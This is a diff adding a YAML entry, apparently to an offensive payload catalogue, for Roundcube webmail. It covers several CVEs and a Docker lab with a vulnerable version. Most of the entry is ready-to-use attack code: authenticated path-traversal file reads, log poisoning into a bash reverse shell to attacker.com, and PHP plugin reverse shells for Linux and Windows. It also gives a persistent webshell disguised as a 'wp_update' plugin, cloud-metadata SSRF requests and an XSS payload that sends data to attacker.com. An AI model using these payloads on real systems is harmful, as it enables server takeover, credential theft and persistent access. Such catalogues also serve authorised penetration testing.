@@ -1,0 +1,265 @@
+---
+comment: "Roundcube is a widely deployed PHP webmail client used across shared hosting\
+  \ and\ncorporate mail infrastructure.\n\nCVE-2023-43770 (CVSS 6.1): Persistent XSS\
+  \ via href injection in received emails.\nA crafted mailto: link in an HTML email\
+  \ causes the href attribute to be reflected\nunescaped into the rendered page, executing\
+  \ attacker-controlled JavaScript in the\nvictim's browser when they open the email.\
+  \ This is a client-side vector only \u2014\nno direct server-side code execution.\
+  \ Affects Roundcube < 1.4.14, < 1.5.4, < 1.6.3.\nUsed in the wild by APT28 (Fancy\
+  \ Bear) to steal session cookies and authentication\ntokens from government targets.\
+  \ Ref: https://www.exploit-db.com/exploits/51721\n\nCVE-2024-37383 (CVSS 6.1): XSS\
+  \ via SVG animate href attribute in HTML emails.\nAn SVG <animate attributeName=\"\
+  href\"> element in a received email injects arbitrary\nJavaScript executed in the\
+  \ victim's browser session. Client-side only. Affects\nRoundcube < 1.5.7 and < 1.6.7.\n\
+  \nCVE-2020-12640: Path traversal in Roundcube < 1.4.3 (authenticated). The\n_template\
+  \ parameter in various actions is not sanitised, allowing a logged-in user\nto include\
+  \ arbitrary local PHP files relative to the Roundcube root, potentially\nleading\
+  \ to information disclosure or code execution if a writable PHP file exists.\n\n\
+  Admin-level server-side RCE: Roundcube stores its configuration in\nconfig/config.inc.php.\
+  \ An attacker with filesystem write access (e.g., via a\nprevious file-write step)\
+  \ can modify include_path or plugin settings to load\nattacker-controlled PHP. The\
+  \ managesieve plugin's script editing interface can\nalso be abused by admins to\
+  \ write Sieve filter files; combined with a local file\ninclusion this reaches code\
+  \ execution.\n"
+docker:
+  compose: "services:\n  roundcube:\n    image: roundcube/roundcubemail:1.6.5-apache\n\
+    \    ports:\n      - \"8080:80\"\n    environment:\n      ROUNDCUBEMAIL_DEFAULT_HOST:\
+    \ imap\n      ROUNDCUBEMAIL_SMTP_SERVER: imap\n      ROUNDCUBEMAIL_DB_TYPE: sqlite\n\
+    \    depends_on:\n      - imap\n  imap:\n    image: greenmail/standalone:2.0.1\n\
+    \    ports:\n      - \"3025:3025\"\n      - \"3143:3143\"\n"
+  note: 'Starts Roundcube 1.6.5 (vulnerable to CVE-2024-37383 XSS) with a GreenMail
+    IMAP/SMTP
+
+    server for self-contained testing. Access at `http://localhost:8080`.
+
+    Log in with any username and password (GreenMail auto-creates accounts on first
+    login).
+
+    To test XSS payloads: send a crafted HTML email to a test account via GreenMail''s
+
+    SMTP on port 3025, then open the email in Roundcube.
+
+    For CVE-2020-12640 testing, use `roundcube/roundcubemail:1.4.2-apache` instead.
+
+    '
+functions:
+  file-read:
+  - code: |
+      # CVE-2020-12640: read arbitrary files by traversing to a PHP file that echoes its own contents
+      # More directly: read config/config.inc.php (contains DB credentials and IMAP passwords)
+      # by including a PHP wrapper that reads and outputs the target file:
+
+      # Step 1: create a PHP reader stub in a writable location (e.g., via a prior write step):
+      # <?php echo file_get_contents('/etc/passwd'); ?>  --> save as /tmp/reader.php
+
+      # Step 2: include it via path traversal
+      curl -s -b "roundcube_sessid=<valid_session>" \
+        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../tmp/reader"
+
+      # Direct config read target (adjust path as needed):
+      # /var/www/html/roundcube/config/config.inc.php  (DB host, user, password, IMAP settings)
+      # /var/www/roundcubemail/config/config.inc.php
+    comment: |
+      CVE-2020-12640: reading arbitrary files via path traversal requires a PHP wrapper
+      stub at a reachable path, since the _template parameter is included as PHP (not
+      read as plain text). The most valuable direct read target is config/config.inc.php,
+      which contains the database credentials and IMAP server connection details in
+      plaintext. Combine with log poisoning to achieve the stub without a prior write step.
+    contexts:
+      authenticated:
+    version: |
+      < 1.4.3
+  rce:
+  - code: |
+      # CVE-2020-12640: local PHP file inclusion via path traversal (authenticated)
+      # Step 1: identify a writable PHP file under the Roundcube root (e.g., via a
+      #         previous file-write step or log poisoning into a Roundcube log file)
+      # Step 2: include the file via the _template parameter:
+      curl -s -b "roundcube_sessid=<valid_session>" \
+        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../tmp/rce"
+
+      # The _template value is appended with .php and included via PHP require().
+      # If /tmp/rce.php contains PHP code (e.g., poisoned via a log file), it executes.
+    comment: |
+      CVE-2020-12640: Roundcube's template renderer appends .php and passes the
+      _template parameter directly to require() without path sanitisation. An
+      authenticated attacker who can write a PHP file anywhere on the server
+      (e.g., via log poisoning, IMAP injection into a Roundcube log) can include
+      it using directory traversal to achieve server-side code execution.
+      Requires a valid Roundcube session (any account). Runs as the web server user.
+      Ref: https://roundcube.net/news/2020/04/29/security-updates-1.4.3-and-1.3.12
+    contexts:
+      authenticated:
+    version: |
+      < 1.4.3
+  - code: |
+      # Admin RCE via config file modification (requires filesystem write access)
+      # Modify config/config.inc.php to load an attacker-controlled PHP file:
+      # $config['plugins'] = array('attacker_plugin');
+      # Then place the plugin at plugins/attacker_plugin/attacker_plugin.php
+
+      # Plugin skeleton (plugins/attacker_plugin/attacker_plugin.php):
+      cat > /path/to/roundcube/plugins/attacker_plugin/attacker_plugin.php << 'EOF'
+      <?php
+      class attacker_plugin extends rcube_plugin {
+          function init() {
+              if (isset($_REQUEST['c'])) {
+                  echo shell_exec($_REQUEST['c']);
+              }
+          }
+      }
+      EOF
+    comment: |
+      Admin filesystem RCE: Roundcube auto-loads PHP plugin files listed in
+      $config['plugins'] within config/config.inc.php. An attacker with write
+      access to the Roundcube filesystem (e.g., gained via a prior exploitation step)
+      can drop a malicious plugin and add it to the plugins array. The plugin's init()
+      method executes on every Roundcube page load.
+      This requires filesystem-level access, not just Roundcube admin credentials.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2020-12640 + log poisoning reverse shell chain
+      # Step 1: poison a Roundcube log file with a PHP reverse shell payload
+      # (send an IMAP login with a crafted username that gets logged)
+      curl -s -X POST "http://victim.com/" \
+        --data "_task=login&_action=login&_user=<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/12345 0>&1\" &'); ?>&_pass=x"
+
+      # Step 2: include the poisoned log via path traversal
+      curl -s -b "roundcube_sessid=<valid_session>" \
+        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../var/log/roundcube/errors"
+    comment: |
+      CVE-2020-12640 combined with log poisoning: PHP code injected into a Roundcube
+      log file (via a failed login with a PHP payload as the username) is executed
+      when the log file is included via the path traversal vulnerability. The reverse
+      shell payload in the username is written to the errors log by Roundcube's logger.
+      The exec() call is fire-and-forget with & so the HTTP request completes normally.
+      Check the listener for the incoming connection.
+    contexts:
+      authenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      < 1.4.3
+  - blind: true
+    code: |
+      <?php
+      // Malicious Roundcube plugin reverse shell (Linux)
+      // Place in plugins/rshell/rshell.php, add 'rshell' to $config['plugins']
+      class rshell extends rcube_plugin {
+          function init() {
+              exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
+          }
+      }
+      ?>
+    comment: |
+      Roundcube plugin reverse shell for Linux: the plugin's init() method fires on
+      every page load after being added to config/config.inc.php. The exec() call is
+      fire-and-forget with & so the HTTP response completes normally.
+      Requires filesystem write access to the Roundcube plugins directory and the
+      ability to modify config/config.inc.php.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      <?php
+      // Malicious Roundcube plugin reverse shell (Windows)
+      // Place in plugins/rshell/rshell.php, add 'rshell' to $config['plugins']
+      class rshell extends rcube_plugin {
+          function init() {
+              $ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}';
+              popen('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "' . $ps . '"', 'r');
+          }
+      }
+      ?>
+    comment: |
+      Windows variant: Roundcube plugin that spawns a PowerShell reverse shell on every
+      page load. Uses popen() to launch PowerShell detached from PHP.
+      Requires filesystem write access and the ability to modify config/config.inc.php.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
+    tty: false
+  ssrf:
+  - code: |
+      # Roundcube "Fetch remote content" SSRF via HTML email rendering
+      # Send an HTML email to the target user containing an img src pointing to an
+      # internal resource. When the victim clicks "Load remote images", Roundcube
+      # optionally proxies the request server-side through the _action=get endpoint.
+
+      # If Roundcube is configured with $config['show_images'] = 'proxy' (non-default):
+      curl -s -b "roundcube_sessid=<valid_session>" \
+        "http://victim.com/index.php?_task=mail&_action=get&_src=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+      # Cloud metadata endpoints:
+      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # GCP:        http://metadata.google.internal/computeMetadata/v1/
+      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    comment: |
+      Semi-blind SSRF via Roundcube's optional remote content proxy. When
+      $config['show_images'] is set to 'proxy', the _action=get endpoint fetches
+      remote images server-side and returns them to the browser. Setting _src to an
+      internal URL causes the Roundcube server to make an outbound HTTP request to that
+      address. The response body is returned inline in the HTTP response, making this
+      a non-blind SSRF. Requires a valid session. Not enabled by default.
+    contexts:
+      authenticated:
+  - code: |
+      # XSS-to-SSRF escalation via CVE-2023-43770 / CVE-2024-37383
+      # The XSS payload fires in the victim's authenticated browser session.
+      # Use fetch() to make authenticated requests to internal Roundcube endpoints,
+      # which then perform server-side actions on behalf of the victim.
+      #
+      # Example XSS payload that exfiltrates the session cookie and performs
+      # a same-origin request to the remote-content proxy:
+      #
+      # <a href="javascript:fetch('/index.php?_task=mail&amp;_action=get&amp;_src=http://169.254.169.254/latest/meta-data/',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/x?d='+btoa(d)))">click here</a>
+      #
+      # CVE-2023-43770: inject the payload via the href attribute of a mailto: link in
+      # a received HTML email. The href value is reflected unescaped into the page.
+      # CVE-2024-37383: inject via SVG <animate attributeName="href"> in HTML email.
+    comment: "Client-side XSS \u2192 server-side SSRF escalation chain using CVE-2023-43770\
+      \ or\nCVE-2024-37383. Both CVEs deliver persistent XSS payloads via crafted\
+      \ HTML\nemails. The JavaScript executes in the authenticated victim's browser\
+      \ session\nand can make same-origin authenticated requests to Roundcube endpoints\
+      \ that\nperform server-side URL fetching, effectively turning a client-side\
+      \ XSS into\na server-side SSRF. The SSRF leg only works if the proxy is enabled\
+      \ server-side.\nCVE-2023-43770: Ref: https://www.exploit-db.com/exploits/51721\n\
+      nuclei: CVE-2023-43770 / CVE-2024-37383\nUsed in the wild by APT28 against European\
+      \ government webmail systems (2023).\n"
+    contexts:
+      unauthenticated:
+    version: |
+      CVE-2023-43770: < 1.4.14 / < 1.5.4 / < 1.6.3
+      CVE-2024-37383: < 1.5.7 / < 1.6.7
+  webshell:
+  - code: |
+      <?php
+      // Roundcube plugin webshell
+      // Place in plugins/wp_update/wp_update.php, add 'wp_update' to $config['plugins']
+      class wp_update extends rcube_plugin {
+          function init() {
+              if (isset($_REQUEST['c'])) {
+                  header('Content-Type: text/plain');
+                  echo shell_exec($_REQUEST['c']);
+                  exit;
+              }
+          }
+      }
+      ?>
+    comment: |
+      Persistent webshell via a malicious Roundcube plugin. Once the plugin is placed
+      and registered in config/config.inc.php, the shell is accessible on every
+      Roundcube page load: http://victim.com/?c=id
+      Requires filesystem write access to the plugins directory and config file.
+      Output is returned as plain text before Roundcube renders its normal HTML.
+    contexts:
+      admin:
+...
